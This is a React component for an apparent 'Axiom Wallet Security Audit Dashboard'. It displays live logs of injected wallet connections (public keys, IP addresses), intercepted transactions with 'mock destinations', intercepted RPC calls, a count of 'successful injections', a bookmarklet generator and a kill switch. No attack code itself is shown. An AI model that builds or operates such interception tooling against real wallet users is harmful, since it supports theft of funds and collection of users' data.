import React, { useState, useEffect } from 'react';
import { io, Socket } from 'socket.io-client';
import BookmarkletGenerator from './BookmarkletGenerator';

interface ConnectionLog {
  id: string;
  timestamp: string;
  userAgent: string;
  publicKey: string;
  ipAddress: string;
  success: boolean;
  hashIdentifier: string;
  walletType: string;
}

interface TransactionLog {
  id: string;
  timestamp: string;
  publicKey: string;
  transaction: string;
  intercepted: boolean;
  mockDestination: string;
  hashIdentifier: string;
  method: string;
}

interface RpcLog {
  id: string;
  timestamp: string;
  url: string;
  method: string;
  intercepted: boolean;
  hashIdentifier: string;
}

const AxiomAuditDashboard: React.FC = () => {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [connections, setConnections] = useState<ConnectionLog[]>([]);
  const [transactions, setTransactions] = useState<TransactionLog[]>([]);
  const [rpcLogs, setRpcLogs] = useState<RpcLog[]>([]);
  const [status, setStatus] = useState({
    active: false,
    connections: 0,
    successfulInjections: 0,
    lastUpdated: ''
  });
  const [killSwitchActive, setKillSwitchActive] = useState(false);

  useEffect(() => {
    const newSocket = io();
    setSocket(newSocket);

    // Fetch initial data
    fetch('/api/logs')
      .then(res => res.json())
      .then(data => {
        setConnections(data.connections || []);
        setTransactions(data.transactions || []);
        setRpcLogs(data.rpc || []);
      })
      .catch(err => console.error('Error fetching logs:', err));

    // Listen for real-time updates
    newSocket.on('new-connection', (connection: ConnectionLog) => {
      setConnections(prev => [connection, ...prev]);
    });

    newSocket.on('new-transaction', (transaction: TransactionLog) => {
      setTransactions(prev => [transaction, ...prev]);
    });

    newSocket.on('new-rpc', (rpc: RpcLog) => {
      setRpcLogs(prev => [rpc, ...prev]);
    });

    newSocket.on('status', (newStatus) => {
      setStatus(newStatus);
    });

    newSocket.on('kill-switch-activated', () => {
      setKillSwitchActive(true);
    });

    return () => {
      newSocket.close();
    };
  }, []);

  const activateKillSwitch = () => {
    fetch('/api/kill-switch', { method: 'POST' })
      .then(res => res.json())
      .then(data => {
        console.log('Kill switch activated:', data);
        setKillSwitchActive(true);
      })
      .catch(err => console.error('Error activating kill switch:', err));
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  if (killSwitchActive) {
    return (
      <div className="p-6 bg-red-50 rounded-lg">
        <h2 className="text-2xl font-bold text-red-600 mb-4">Testing Period Ended</h2>
        <p className="text-red-500">The security audit has been terminated by the kill switch.</p>
      </div>
    );
  }

  return (
    <div className="p-6 bg-white rounded-lg shadow-md">
      <h2 className="text-2xl font-bold mb-6">Axiom Wallet Security Audit Dashboard</h2>
      
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
        <div className="bg-blue-50 p-4 rounded-lg">
          <h3 className="font-semibold text-blue-700 mb-2">Active Connections</h3>
          <p className="text-3xl font-bold text-blue-600">{status.connections}</p>
        </div>
        
        <div className="bg-green-50 p-4 rounded-lg">
          <h3 className="font-semibold text-green-700 mb-2">Successful Injections</h3>
          <p className="text-3xl font-bold text-green-600">{status.successfulInjections}</p>
        </div>
        
        <div className="bg-purple-50 p-4 rounded-lg">
          <h3 className="font-semibold text-purple-700 mb-2">Last Updated</h3>
          <p className="text-sm text-purple-600">
            {status.lastUpdated ? formatDate(status.lastUpdated) : 'Never'}
          </p>
        </div>
      </div>

      <div className="mb-6">
        <BookmarkletGenerator />
      </div>

      <div className="mb-6">
        <h3 className="text-xl font-semibold mb-4">Recent Connections</h3>
        <div className="overflow-x-auto">
          <table className="min-w-full bg-white">
            <thead>
              <tr>
                <th className="py-2 px-4 border-b">Time</th>
                <th className="py-2 px-4 border-b">Public Key</th>
                <th className="py-2 px-4 border-b">IP Address</th>
                <th className="py-2 px-4 border-b">Wallet Type</th>
              </tr>
            </thead>
            <tbody>
              {connections.slice(0, 10).map((connection) => (
                <tr key={connection.id}>
                  <td className="py-2 px-4 border-b">{formatDate(connection.timestamp)}</td>
                  <td className="py-2 px-4 border-b">{connection.publicKey}</td>
                  <td className="py-2 px-4 border-b">{connection.ipAddress}</td>
                  <td className="py-2 px-4 border-b">{connection.walletType}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="mb-6">
        <h3 className="text-xl font-semibold mb-4">Recent Transactions</h3>
        <div className="overflow-x-auto">
          <table className="min-w-full bg-white">
            <thead>
              <tr>
                <th className="py-2 px-4 border-b">Time</th>
                <th className="py-2 px-4 border-b">Public Key</th>
                <th className="py-2 px-4 border-b">Method</th>
                <th className="py-2 px-4 border-b">Mock Destination</th>
              </tr>
            </thead>
            <tbody>
              {transactions.slice(0, 10).map((transaction) => (
                <tr key={transaction.id}>
                  <td className="py-2 px-4 border-b">{formatDate(transaction.timestamp)}</td>
                  <td className="py-2 px-4 border-b">{transaction.publicKey}</td>
                  <td className="py-2 px-4 border-b">{transaction.method}</td>
                  <td className="py-2 px-4 border-b">{transaction.mockDestination}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="mb-6">
        <h3 className="text-xl font-semibold mb-4">RPC Calls</h3>
        <div className="overflow-x-auto">
          <table className="min-w-full bg-white">
            <thead>
              <tr>
                <th className="py-2 px-4 border-b">Time</th>
                <th className="py-2 px-4 border-b">Method</th>
                <th className="py-2 px-4 border-b">URL</th>
              </tr>
            </thead>
            <tbody>
              {rpcLogs.slice(0, 10).map((rpc) => (
                <tr key={rpc.id}>
                  <td className="py-2 px-4 border-b">{formatDate(rpc.timestamp)}</td>
                  <td className="py-2 px-4 border-b">{rpc.method}</td>
                  <td className="py-2 px-4 border-b">{rpc.url}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="flex justify-end">
        <button
          onClick={activateKillSwitch}
          className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded"
        >
          Activate Kill Switch
        </button>
      </div>
    </div>
  );
};

export default AxiomAuditDashboard;
